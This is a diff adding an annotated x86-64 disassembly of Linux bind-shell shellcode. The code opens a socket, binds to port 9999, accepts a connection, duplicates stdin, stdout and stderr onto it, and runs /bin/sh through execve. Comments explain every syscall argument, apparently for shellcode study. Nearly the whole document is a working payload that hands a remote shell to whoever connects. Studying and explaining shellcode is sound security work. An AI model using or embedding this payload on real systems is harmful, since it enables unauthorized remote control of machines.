@@ -1,0 +1,67 @@
+0x0000000000601060 <+0>:	push   0x29    ; push 41 (the 'socket' SYSCALL number in decimal) onto the stack                  
+0x0000000000601062 <+2>:	pop    rax     ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x0000000000601063 <+3>:	cdq            ; convert double word to quad word - extends the sign bit of RAX into the RDX register, this sets the value of RDX to 0, RDX needs to contain the third SYS_SOCKET protocol argument value of '0'    
+0x0000000000601064 <+4>:	push   0x2     ; push 2 onto the stack
+0x0000000000601066 <+6>:	pop    rdi     ; pop that value into RDI (the first SYS_SOCKET argument value of 'PF_INET' - '2')
+0x0000000000601067 <+7>:	push   0x1     ; push 1 onto the stack
+0x0000000000601069 <+9>:	pop    rsi     ; pop that value into RSI (the second SYS_SOCKET argument value of 'SOCK_STREAM' - '1')
+0x000000000060106a <+10>:	syscall        ; issue the 'socket' syscall
+
+
+0x000000000060106c <+12>:	xchg   rdi,rax   ; the syscall will return the socket file descriptor value into RAX, so move that value into RDI to be used for later  
+0x000000000060106e <+14>:	push   rdx       ; push 0 onto the stack - the third value of the 'serveraddr' struct, which is 'htonl(INADDR_ANY)/sin_addr'
+0x000000000060106f <+15>:	mov    DWORD PTR [rsp],0xf270002   ; move the following HEX values into the memory address pointed to by RSP as a DWORD:
+
+0002 (the first WORD value of the 'serveraddr' struct, which is 'AF_INET/sin_family' - '2')
+0f27 (the second WORD value of the 'serveraddr' struct - decimal number 3879 (big-endian) or 9999 (little-endian), which is the listener port
+
+
+0x0000000000601076 <+22>:	mov    rsi,rsp   ; move the second SYS_BIND protocol argument value of '(struct sockaddr*) &serveraddr' - the pointer to the three 'serveraddr' struct values into RSI 
+0x0000000000601079 <+25>:	push   0x10      ; push the third SYS_BIND protocol argument value of 'sizeof(serveraddr)' - '16' (in decimal) onto the stack 
+0x000000000060107b <+27>:	pop    rdx       ; pop that value into RDX
+0x000000000060107c <+28>:	push   0x31      ; push 49 (the 'bind' SYSCALL number in decimal) onto the stack                   
+0x000000000060107e <+30>:	pop    rax       ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x000000000060107f <+31>:	syscall          ; issue the 'bind' syscall
+
+
+
+0x0000000000601081 <+33>:	push   0x32     ; push 50 (the 'listen' SYSCALL number in decimal) onto the stack                      
+0x0000000000601083 <+35>:	pop    rax      ; pop that value into RAX, RAX needs to contain the SYSCALL number
+
+; the second SYS_LISTEN protocol argument value of 'backlog' is not moved into RSI, so whatever the value RSI holds will be set to the backlog value, which will be truncated to 128 (cat /proc/sys/net/core/somaxconn)
+
+0x0000000000601084 <+36>:	syscall         ; issue the 'listen' syscall
+
+
+
+0x0000000000601086 <+38>:	xor    rsi,rsi  ; zero out the SYS_ACCEPT protocol argument value of 'addr' - '00' (NULL)
+
+; RDX still contains the decimal value of 16, which will be the SYS_ACCEPT protocol argument value of 'addrlen'
+
+0x0000000000601089 <+41>:	push   0x2b     ; push 43 (the 'accept' SYSCALL number in decimal) onto the stack                        
+0x000000000060108b <+43>:	pop    rax      ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x000000000060108c <+44>:	syscall         ; issue the 'accept' syscall
+
+
+
+0x000000000060108e <+46>:	xchg   rdi,rax  ; the 'accept' syscall will return the client file descriptor value into RAX, so move that value into RDI to be used as the first dup2 argument value
+0x0000000000601090 <+48>:	push   0x3      ; push 3 onto the stack
+0x0000000000601092 <+50>:	pop    rsi      ; pop that value into RSI 
+0x0000000000601093 <+51>:	dec    rsi      ; decrease the value of RSI to 2 - STDERR in the 'dup2' SYSCALL
+0x0000000000601096 <+54>:	push   0x21     ; push the 'dup2' syscall number 33 (0x21 in HEX) onto the stack
+0x0000000000601098 <+56>:	pop    rax      ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x0000000000601099 <+57>:	syscall         ; issue the 'dup2' syscall
+0x000000000060109b <+59>:	jne    0x601093 <code+51>   ; jump back to the 601093 address where another dup2 syscall is being setup for STDOUT - 1 and then STDIN - 0, unless the zero flag (ZF) is set. If the zero flag is set (e.g. RSI is 0), proceed to the next instruction
+
+
+
+0x000000000060109d <+61>:	push   0x3b     ; push the 'execve' syscall number 59 (0x3B in HEX) onto the stack
+0x000000000060109f <+63>:	pop    rax      ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x00000000006010a0 <+64>:	cdq             ; convert double word to quad word - extends the sign bit of RAX into the RDX register, this sets the value of RDX to 0, RDX needs to point to a memory address containing 0x0000000000000000'. RDX is the 3rd arg (char *const envp[]) of the 'execve' syscall    
+0x00000000006010a1 <+65>:	movabs rbx,0x68732f6e69622f   ; move the 'hs/nib/' value (ASCII) into RBX in reverse (little-endian)
+0x00000000006010ab <+75>:	push   rbx      ; push that value onto the stack
+0x00000000006010ac <+76>:	mov    rdi,rsp  ; RSP is now pointing to a memory address containing the begining of our string (/bin/sh) + 00, so move this memory address into RDI. RDI is the 1st arg (const char *filename) of the 'execve' syscall
+0x00000000006010af <+79>:	push   rdx      ; push 0 onto the stack
+0x00000000006010b0 <+80>:	push   rdi      ; push the memory address of the /bin/sh string onto the stack
+0x00000000006010b1 <+81>:	mov    rsi,rsp  ; move this memory address (the string + 0x0000000000000000) from RSP into RSI. RSI is the 2nd arg (char *const argv[]) of the 'execve' syscall
+0x00000000006010b4 <+84>:	syscall         ; issue the 'execve' syscall
